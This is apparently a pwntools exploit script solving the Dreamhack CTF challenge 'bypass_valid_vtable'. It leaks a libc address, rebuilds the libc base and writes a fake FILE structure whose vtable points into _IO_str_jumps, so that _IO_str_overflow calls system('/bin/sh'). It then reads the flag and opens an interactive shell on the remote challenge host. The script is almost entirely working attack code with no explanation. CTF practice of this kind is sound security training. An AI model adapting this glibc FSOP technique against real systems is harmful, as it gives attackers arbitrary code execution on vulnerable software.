#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 20548
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./bypass_valid_vtable_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000400741
            b* _IO_str_overflow
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
fp = 0x601070

# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
io_str_jumps = libc.sym._IO_str_jumps
log.info("io_str_jumps: " + hex(io_str_jumps))

# call _IO_str_overflow
calc_binsh = (bin_sh - 100)//2
payload = b''
payload = payload.ljust(0x28, b'\0') + p64(calc_binsh) # _IO_write_ptr
payload = payload.ljust(0x40, b'\0') + p64(calc_binsh) # _IO_buf_end
payload = payload.ljust(0x88, b'\0') + p64(0x601800)
payload = payload.ljust(0xd8, b'\0') + p64(io_str_jumps + 8)
payload = payload.ljust(0xe0, b'\0') + p64(system)
# GDB()
p.sendafter(b'Data: ', payload)
p.sendline(b'cat flag')

p.interactive()